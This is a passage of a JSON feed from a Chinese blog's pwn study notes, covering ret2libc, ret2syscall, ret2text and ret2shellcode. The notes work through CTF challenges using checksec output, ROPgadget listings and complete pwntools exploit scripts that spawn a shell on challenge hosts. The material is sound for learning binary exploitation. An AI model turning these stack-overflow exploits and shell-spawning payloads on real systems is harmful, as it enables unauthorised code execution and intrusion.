class=\"line\">Unique gadgets found: 12</span><br></pre></td></tr></table></figure>\n<p>​\t发现找到了，地址是 0x0000000000400506 和 0x0000000000400743，之后就是编写攻击脚本：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> LibcSearcher</span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context(os=<span class=\"string\">&#x27;linux&#x27;</span>, arch=<span class=\"string\">&#x27;amd64&#x27;</span>, log_level=<span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\">p = remote(<span class=\"string\">&#x27;node4.anna.nssctf.cn&#x27;</span>, <span class=\"number\">28230</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./babyof&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#第一次调用puts函数，然后泄露puts函数的真实地址</span></span><br><span class=\"line\">ret = <span class=\"number\">0x400506</span></span><br><span class=\"line\">pop_rdi = <span class=\"number\">0x400743</span></span><br><span class=\"line\">func_vuln_addr = <span class=\"number\">0x400632</span></span><br><span class=\"line\">payload = flat([cyclic(<span class=\"number\">0x40</span> + <span class=\"number\">0x08</span>), pop_rdi, elf.got[<span class=\"string\">&#x27;puts&#x27;</span>], elf.plt[<span class=\"string\">&#x27;puts&#x27;</span>], func_vuln_addr])</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">b&quot;Do you know how to do buffer overflow?\\n&quot;</span>, payload)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">b&#x27;win\\n&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#接收了puts函数的真实地址，ljust之后对齐，再然后就是通过u64打包</span></span><br><span class=\"line\">puts_addr = u64(p.recvuntil(<span class=\"string\">b&#x27;\\n&#x27;</span>)[:-<span class=\"number\">1</span>].ljust(<span class=\"number\">8</span>, <span class=\"string\">b&#x27;\\00&#x27;</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">libc = LibcSearcher(<span class=\"string\">&#x27;puts&#x27;</span>, puts_addr)    <span class=\"comment\">#这个函数有两个参数，第一个参数是已经泄露了地址的函数，第二个参数是该函数的地址</span></span><br><span class=\"line\">libc_base = puts_addr - libc.dump(<span class=\"string\">&#x27;puts&#x27;</span>) <span class=\"comment\">#使用dump函数得到相对于基地址的偏移地址，然后函数真实地址-偏移地址得到基地址</span></span><br><span class=\"line\">system_addr = libc_base + libc.dump(<span class=\"string\">&#x27;system&#x27;</span>)</span><br><span class=\"line\">str_bin_sh = libc_base + libc.dump(<span class=\"string\">&#x27;str_bin_sh&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">payload = flat([cyclic(<span class=\"number\">0x40</span> + <span class=\"number\">0x08</span>), ret, pop_rdi, str_bin_sh, system_addr])</span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">b&quot;Do you know how to do buffer overflow?\\n&quot;</span>, payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<p>​\t为啥第二个 payload 需要加上一个 ret 的地址，大佬的解释如下：</p>\n<p><img data-src=\"https://img-blog.csdnimg.cn/direct/bd744137c4ae4baab0a4b3f11265b4df.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>​\t其实就是对于 Ubuntu18 或者更高的系统，需要完成 16 字节对齐，否则会直接终止程序。</p>\n<p>​\t最后，运行脚本，在那 10 个版本中选择，直到拿到正确的为止。</p>\n",
            "tags": [
                "Pwn"
            ]
        },
        {
            "id": "http://blog.g01den.top/posts/e20e7502.html",
            "url": "http://blog.g01den.top/posts/e20e7502.html",
            "title": "pwn学习笔记（3）ret2syscall",
            "date_published": "2024-02-13T10:10:34.000Z",
            "content_html": "<h1 id=\"pwn学习笔记3\"><a class=\"markdownIt-Anchor\" href=\"#pwn学习笔记3\">#</a> pwn 学习笔记（3）</h1>\n<h2 id=\"rop原理\"><a class=\"markdownIt-Anchor\" href=\"#rop原理\">#</a> ROP 原理：</h2>\n<p>​\tROP (Return Oriented Programming) 返回导向编程，主要思想是通过在程序中已有的小片段（gadgets）来改变某些寄存器或者变量的值，从而控制程序的执行流程。</p>\n<h2 id=\"栈溢出ret2syscall\"><a class=\"markdownIt-Anchor\" href=\"#栈溢出ret2syscall\">#</a> 栈溢出–ret2syscall：</h2>\n<h3 id=\"1系统调用\"><a class=\"markdownIt-Anchor\" href=\"#1系统调用\">#</a> 1. 系统调用：</h3>\n<p>​\t对于一个已经存在于标准库中的函数，例如 printf ()，我们编写某个程序的时候，这个函数仅仅只用了 printf (参数); 这么一行，但是，其工作可是很复杂的，printf () 调用了函数库当中的其他更加底层的函数，然后被调用的函数肯定会调用再底层的函数，知道调用到系统调用中的 write () 函数为止；由上可知，任何一个函数想要完成某样工作，都必须要经过系统调用来操作硬件才能够成功。</p>\n<p>​\t在 Linux 中，系统调用通常通过 int 80h 这一汇编代码实现，int 表示的是终端，interrupt，80h 则是代指的系统调用的终端符号，当程序执行到 int 80h 这一代码的时候，就会将相应的通用寄存器 eax 中的参数作为系统调用的调用号，其他寄存器中的值或者地址所指向的值作为参数，例如：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">execve(<span class=\"string\">&quot;/bin/sh&quot;</span>,<span class=\"literal\">NULL</span>,<span class=\"literal\">NULL</span>)   <span class=\"comment\">//（32位程序）</span></span><br></pre></td></tr></table></figure>\n<p>​\t该函数的系统调用号为 11，这里可以通过.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat /usr/include/asm/unistd_32.h | grep execve </span><br></pre></td></tr></table></figure>\n<p>进行查询，那么，如果想要调用 execve () 函数，就需要提前让相应的通用寄存器置于正确的值，这样才能进行正确的系统调用，所以需要让：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eax=0xb</span><br><span class=\"line\"></span><br><span class=\"line\">ebx=/bin/sh 的地址</span><br><span class=\"line\"></span><br><span class=\"line\">ecx=0</span><br><span class=\"line\"></span><br><span class=\"line\">edx=0</span><br></pre></td></tr></table></figure>\n<h3 id=\"2题目示例ctf-wikipwn-ret2syscall\"><a class=\"markdownIt-Anchor\" href=\"#2题目示例ctf-wikipwn-ret2syscall\">#</a> 2. 题目示例（ctf-Wiki—pwn-ret2syscall）：</h3>\n<p>​\t首先应该检测程序的保护：</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">➜  ret2syscall checksec rop</span><br><span class=\"line\">    Arch:     i386-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>\n<p>​\t可以看出，程序是一个 32 位小端序之开启了 NX 保护的程序，之后用 IDA 静态调试一下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __cdecl <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">const</span> <span class=\"type\">char</span> **argv, <span class=\"type\">const</span> <span class=\"type\">char</span> **envp)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> v4; <span class=\"comment\">// [sp+1Ch] [bp-64h]@1</span></span><br><span class=\"line\"></span><br><span class=\"line\">  setvbuf(<span class=\"built_in\">stdout</span>, <span class=\"number\">0</span>, <span class=\"number\">2</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  setvbuf(<span class=\"built_in\">stdin</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;This time, no system() and NO SHELLCODE!!!&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;What do you plan to do?&quot;</span>);</span><br><span class=\"line\">  gets(&amp;v4);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t这里仍是一个栈溢出的题目，危险函数很明显，可以直接利用到，之后，类似于之前的做法，我们可以获得 v4 相对于 ebp 的偏移为 108。所以我们需要覆盖的返回地址相对于 v4 的偏移为 112。此次，由于我们不能直接利用程序中的某一段代码或者自己填写代码来获得 shell，所以我们利用程序中的 gadgets 来获得 shell，而对应的 shell 获取则是利用系统调用。</p>\n<p>​\t因此，接下来，需要达成的系统调用，就是</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">execve(<span class=\"string\">&quot;/bin/sh&quot;</span>,<span class=\"literal\">NULL</span>,<span class=\"literal\">NULL</span>)</span><br></pre></td></tr></table></figure>\n<p>​\t之后，就需要按照如下的方式来置位正确的寄存器的值</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">系统调用号，即 eax 应该为 0xb</span><br><span class=\"line\">第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。</span><br><span class=\"line\">第二个参数，即 ecx 应该为 0</span><br><span class=\"line\">第三个参数，即 edx 应该为 0</span><br></pre></td></tr></table></figure>\n<p>​\t那么，能够直接操作寄存器的则是汇编代码，因此，则需要使用 ROPgadget 工具来寻找相关的代码：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">➜  ret2syscall ROPgadget --binary rop  --only &#x27;pop|ret&#x27; | grep &#x27;eax&#x27;</span><br><span class=\"line\">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class=\"line\">0x080bb196 : pop eax ; ret</span><br><span class=\"line\">0x0807217a : pop eax ; ret 0x80e</span><br><span class=\"line\">0x0804f704 : pop eax ; ret 3</span><br><span class=\"line\">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br></pre></td></tr></table></figure>\n<p>​\t以及：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">➜  ret2syscall ROPgadget --binary rop  --only &#x27;pop|ret&#x27; | grep &#x27;ebx&#x27;</span><br><span class=\"line\">0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class=\"line\">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class=\"line\">0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class=\"line\">0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret</span><br><span class=\"line\">0x080be23f : pop ebx ; pop edi ; ret</span><br><span class=\"line\">0x0806eb69 : pop ebx ; pop edx ; ret</span><br><span class=\"line\">0x08092258 : pop ebx ; pop esi ; pop ebp ; ret</span><br><span class=\"line\">0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class=\"line\">0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10</span><br><span class=\"line\">0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14</span><br><span class=\"line\">0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc</span><br><span class=\"line\">0x0805ae81 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4</span><br><span class=\"line\">0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8</span><br><span class=\"line\">0x08048913 : pop ebx ; pop esi ; pop edi ; ret</span><br><span class=\"line\">0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4</span><br><span class=\"line\">0x08049a94 : pop ebx ; pop esi ; ret</span><br><span class=\"line\">0x080481c9 : pop ebx ; ret</span><br><span class=\"line\">0x080d7d3c : pop ebx ; ret 0x6f9</span><br><span class=\"line\">0x08099c87 : pop ebx ; ret 8</span><br><span class=\"line\">0x0806eb91 : pop ecx ; pop ebx ; ret</span><br><span class=\"line\">0x0806336b : pop edi ; pop esi ; pop ebx ; ret</span><br><span class=\"line\">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span><br><span class=\"line\">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class=\"line\">0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret</span><br><span class=\"line\">0x0805c820 : pop esi ; pop ebx ; ret</span><br><span class=\"line\">0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class=\"line\">0x0807b6ed : pop ss ; pop ebx ; ret</span><br></pre></td></tr></table></figure>\n<p>​\t这里找到了这个：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span><br></pre></td></tr></table></figure>\n<p>​\t然后就是 /bin/sh 的地址了：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">➜  ret2syscall ROPgadget --binary rop  --string &#x27;/bin/sh&#x27; </span><br><span class=\"line\">Strings information</span><br><span class=\"line\">============================================================</span><br><span class=\"line\">0x080be408 : /bin/sh</span><br></pre></td></tr></table></figure>\n<p>​\t最后则是 int 80h 的地址：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">➜  ret2syscall ROPgadget --binary rop  --only &#x27;int&#x27;                 </span><br><span class=\"line\">Gadgets information</span><br><span class=\"line\">============================================================</span><br><span class=\"line\">0x08049421 : int 0x80</span><br><span class=\"line\">0x080938fe : int 0xbb</span><br><span class=\"line\">0x080869b5 : int 0xf6</span><br><span class=\"line\">0x0807b4d4 : int 0xfc</span><br><span class=\"line\"></span><br><span class=\"line\">Unique gadgets found: 4</span><br></pre></td></tr></table></figure>\n<p>​\t像这样，按照寄存器以及值的关系，依次将寄存器置位正确的值，之后执行 int 80h，即可达到正确的系统调用，相应的脚本如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">sh = process(&#x27;./rop&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">pop_eax_ret = 0x080bb196</span><br><span class=\"line\">pop_edx_ecx_ebx_ret = 0x0806eb90</span><br><span class=\"line\">int_0x80 = 0x08049421</span><br><span class=\"line\">binsh = 0x80be408</span><br><span class=\"line\">payload = flat(</span><br><span class=\"line\">    [&#x27;A&#x27; * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])</span><br><span class=\"line\">sh.sendline(payload)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "Pwn"
            ]
        },
        {
            "id": "http://blog.g01den.top/posts/c3c1bd42.html",
            "url": "http://blog.g01den.top/posts/c3c1bd42.html",
            "title": "Pwn学习笔记（2）--ret_2_text_or_shellcode",
            "date_published": "2024-02-04T10:10:34.000Z",
            "content_html": "<h1 id=\"pwn学习笔记2\"><a class=\"markdownIt-Anchor\" href=\"#pwn学习笔记2\">#</a> pwn 学习笔记（2）</h1>\n<h2 id=\"1三种常见的寄存器\"><a class=\"markdownIt-Anchor\" href=\"#1三种常见的寄存器\">#</a> 1. 三种常见的寄存器：</h2>\n<p>​\tax 寄存器：通用寄存器，可用于存放多种数据</p>\n<p>​\tbp 寄存器：存放的是栈帧的栈底地址</p>\n<p>​\tsp 寄存器：存放的是栈顶的地址</p>\n<h2 id=\"2栈帧与栈工作的简介\"><a class=\"markdownIt-Anchor\" href=\"#2栈帧与栈工作的简介\">#</a> 2. 栈帧与栈工作的简介：</h2>\n<p>​\t\t栈帧是存储函数的一些信息的地方，栈帧存储有函数的局部变量，传递给子函数的实际参数，父函数的地址以及上一个栈帧栈底的地址，大致情况如下：</p>\n<p><img data-src=\"https://img-blog.csdnimg.cn/direct/fb7f5e074f454da6b1459fd822dc9036.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>​\t在函数调用的过程中，首先会讲 bp 寄存器的值进行压栈，以方便在恢复的时候恢复栈底寄存器的值，再之后，会按顺序将局部变量压栈，最后是子函数的实际参数，会按照先入栈的后出栈，从最后一个实际参数先入栈再到第一个实际参数，比如函数 a (int a , int b)，压栈的方式就是先压栈 b 的实际参数，再压栈 a 的实际参数，当这些压栈完成之后，就可以压栈父函数调用子函数的那条语句的下一条语句的地址，紧接着，可以压栈当前栈帧的栈底地址了。</p>\n<p>​\t具体的汇编语言实现就不多做解释了，因为我这里只是简述。</p>\n<h2 id=\"3缓冲区溢出漏洞\"><a class=\"markdownIt-Anchor\" href=\"#3缓冲区溢出漏洞\">#</a> 3. 缓冲区溢出漏洞：</h2>\n<p>​\t缓冲区溢出楼哦对那个的本质就是向定长的缓冲区中写入了超长的数据，造成了写入的数据覆盖了其他合法的内存区域。</p>\n<h2 id=\"4栈溢出之ret2text\"><a class=\"markdownIt-Anchor\" href=\"#4栈溢出之ret2text\">#</a> 4. 栈溢出之–ret2text：</h2>\n<h3 id=\"1原理\"><a class=\"markdownIt-Anchor\" href=\"#1原理\">#</a> （1）原理：</h3>\n<p>​\tret2text 应该是最简单的栈溢出漏洞利用的方式也是最简单的：</p>\n<p>​\t假设，在栈中，存在如下情况：</p>\n<p><img data-src=\"https://img-blog.csdnimg.cn/direct/ee2c57b57c254a6fb3f6f4edb0e9391b.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>​</p>\n<p>其 C 程序源代码如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">overflow</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">char</span> buf[<span class=\"number\">8</span>];</span><br><span class=\"line\">    gets(buf);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>当程序运行到 gets 的时候，因为 gets 没有对用户输入的内容的长度进行限制，就导致了本来最多输入 8 字节的内容，结果输入了超过 8 字节的内容导致了溢出，覆盖掉了 bp 寄存器以及返回地址的值，如下：</p>\n<p><img data-src=\"https://img-blog.csdnimg.cn/direct/46531ac3516e437caee9cd80941f185d.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>​\t之后，可以通过如上的原理，将返回地址的值修改为程序自带的后门函数（如 system (&quot;/bin/sh&quot;)）中即可。</p>\n<h3 id=\"2题目示例nssctf-2022-spring-recruitr3m4ke\"><a class=\"markdownIt-Anchor\" href=\"#2题目示例nssctf-2022-spring-recruitr3m4ke\">#</a> （2）题目示例–[NSSCTF 2022 Spring Recruit] R3m4ke?：</h3>\n<p>​\t拿到 ELF 文件之后第一步应该先检查相关的保护，因为保护这里还没有讲，所以这里拿到的是一个只开了 NX 保护的题目，该保护对这道题几乎没有什么影响。</p>\n<p><img data-src=\"https://img-blog.csdnimg.cn/direct/7def99ff9bb140a2a03df9b1a04444cf.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>​\t这里可以看出，这个文件是一个 64 位的小端序文件，所以这里使用 IDA 进行反编译：</p>\n<p><img data-src=\"https://img-blog.csdnimg.cn/direct/9ac23fd3d87546dcb03b398658d926b9.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>​\t这里可以很直观的发现，该函数声明了一个 32 字节的变量，之后通过 gets () 函数来写入内容，但是却没有对长度进行相关的限制，因此存在溢出漏洞，这个时候就只需要找到后门函数的地址即可，之后通过 Sheft+F12，找到 /bin/sh 这个字符串，然后跟进，发现它存在于一个叫做 LookAtMe () 这个函数中，这里，也可以直接从函数视图中找到后门：</p>\n<p><img data-src=\"https://img-blog.csdnimg.cn/direct/2a634e35ccb943d381dd3777ceb0fc56.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>​\t这里可以找到后门函数的地址，及 0x40072C，因此，这里就可以编写 exp，如下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">io = remote(<span class=\"string\">&quot;node4.anna.nssctf.cn&quot;</span>,<span class=\"number\">28043</span>)</span><br><span class=\"line\">payload = <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">0x28</span> + p64(<span class=\"number\">0x40072C</span>)</span><br><span class=\"line\">io.sendline(payload)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n<p>​\t运行代码之后成功拿到了目标主机的 shell：</p>\n<p><img data-src=\"https://img-blog.csdnimg.cn/direct/2c80dc47052b4c0b99da4499f6cf23e2.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"5栈溢出之ret2shellcode\"><a class=\"markdownIt-Anchor\" href=\"#5栈溢出之ret2shellcode\">#</a> 5. 栈溢出之–ret2shellcode：</h2>\n<h3 id=\"1原理-2\"><a class=\"markdownIt-Anchor\" href=\"#1原理-2\">#</a> （1）原理：</h3>\n<p>​\t该方法原理与 ret2shellcode 类似，只是，原本存在的后门没有了，但是给了足够的可写入的地方于用户写入 shellcode 代码，这里前期存在两种方法写入 shellcode，第一种是写入 Stack 中，第二种是写入 bss 段，准确地说，必须当一个段中存在可写可执行的权限时才能进行 ret2shellcode。</p>\n<p>​\t步骤大致是，首先修改下一些配置信息，比如 context.arch，当程序时 64 位时，应该讲此修改为 amd64；之后，让 python 程序自动生成一个 shellcode 或者去相应的地方找，python 的相关代码是：shellcraft [.amd64].sh ()；之后通过 asm () 函数将生成的 shllcode 编译成机器码；然后就是发送相关的垃圾数据之类的进行后续操作。</p>\n<h3 id=\"2题目案例hnctf-2022-week1ret2shellcode\"><a class=\"markdownIt-Anchor\" href=\"#2题目案例hnctf-2022-week1ret2shellcode\">#</a> （2）题目案例–[HNCTF 2022 Week1] ret2shellcode</h3>\n<p>​\t先查看它的保护类型：</p>\n<p><img data-src=\"https://img-blog.csdnimg.cn/direct/c1a04d4871a6468a9009b2ab3e122848.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>发现跟上一个一致，这里可以简单说下 NX 保护，NX 保护是栈不可执行，开启了这个保护之后，在栈上写入的 shellcode 将不会因为我们修改的 return address 的值而执行，因此，我们可以把目标放到 bss 段上，不过，首先还是得确保 bss 段是否存在可执行权限。</p>\n<p>​\t对于这道题，首先应该反编译，得到伪代码：</p>\n<p><img data-src=\"https://img-blog.csdnimg.cn/direct/bae3083c571a4f3ca431d421ec703486.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>我们可以发现，在 main 函数中，这里并没有生命 buff 变量， 但是这里却可以直接使用，说明 buff 是在全局变量中进行的声明，因此这里跟进这个变量，发现其在 bss 段中：</p>\n<p><img data-src=\"https://img-blog.csdnimg.cn/direct/b596d670671f4ecf843459c14d1a037c.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>另外，通过 pwndbg 的 vmmap 命令可以知道这段内存存在可执行的权限：</p>\n<p><img data-src=\"https://img-blog.csdnimg.cn/direct/2b6bc44c1d3448dcbf4a298ef01afe7a.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>因此，这个题目的思路就很明了了，首先是程序的分析，通过写入字符串给 s，然后将 s 的内容复制给 buff，限制的 s 的写入长度长于 256 字节，因此存在缓冲区溢出漏洞，这里就很明了了，代码如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">io = remote(<span class=\"string\">&quot;node5.anna.nssctf.cn&quot;</span>,<span class=\"number\">28172</span>)</span><br><span class=\"line\">context.arch = <span class=\"string\">&quot;amd64&quot;</span></span><br><span class=\"line\">shellcode = asm(shellcraft.amd64.sh())</span><br><span class=\"line\">buff = <span class=\"number\">0x4040A0</span></span><br><span class=\"line\">payload = shellcode.ljust(<span class=\"number\">0x108</span>,<span class=\"string\">b&#x27;A&#x27;</span>) + p64(buff)</span><br><span class=\"line\">io.sendline(payload)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n<p>最后成功拿到目标 shell：</p>\n<p><img data-src=\"https://img-blog.csdnimg.cn/direct/52851acf64c0452f9dcff98caec859a4.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n",
            "tags": [
                "Pwn"
            ]
        },
        {
            "id": "http://blog.g01den.top/posts/c06afb6e.html",
            "url": "http://blog.g01den.top/posts/c06afb6e.html",
            "title": "Pwn学习笔记（1）--前置知识",
            "date_published": "2024-02-04T07:12:55.000Z",
